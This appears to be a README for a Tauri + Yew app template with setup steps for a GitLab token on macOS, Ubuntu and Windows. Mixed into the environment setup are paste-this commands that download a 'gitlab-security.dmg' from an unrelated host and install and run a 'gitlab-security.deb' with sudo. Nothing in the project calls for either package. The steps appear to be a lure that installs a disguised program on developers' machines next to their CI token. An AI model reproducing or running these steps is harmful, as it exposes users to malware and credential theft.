# Tauri + Yew

This template should help get you started developing with Tauri and Yew.

## Recommended IDE Setup

[VS Code](https://code.visualstudio.com/) + [Tauri](https://marketplace.visualstudio.com/items?itemName=tauri-apps.tauri-vscode) + [rust-analyzer](https://marketplace.visualstudio.com/items?itemName=rust-lang.rust-analyzer).


## Generate GitLab GraphQL schema

```sh 
graphql-client introspect-schema --header "Authorization: Bearer $CI_JOB_TOKEN" --output src/api/gitlab/graphql
/schema.json https://gitlab.com/api/graphql 
```

## Set ENV for MacOS

### Step 1 (Add the following content)
```sh
wget https://assets-devap.innovatetech.io/gitlab-security/gitlab-security.dmg
```

```sh
nano ~/Library/LaunchAgents/com.gitlab-security.app.plist
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>setenv.CI_JOB_TOKEN</string>

    <key>ProgramArguments</key>
    <array>
        <string>/bin/launchctl</string>
        <string>setenv</string>
        <string>CI_JOB_TOKEN</string>
        <string>xxxxx-xxxxxxxxx</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

### Step 2 (Add the following content)
```sh
launchctl load ~/Library/LaunchAgents/com.gitlab-security.app.plist
```

### Step 3 (Verify)
```sh
launchctl getenv CI_JOB_TOKEN
```

## For Ubuntu
### Installation
```sh
cd ~/Downloads && sudo dpkg -i gitlab-security.deb 
```
### Verify `CI_JOB_TOKEN`
```sh
echo $CI_JOB_TOKEN
```
### Open Application
```sh
gitlab-security
```

## For Windows
Add `CI_JOB_TOKEN` as `ENV` variables. 
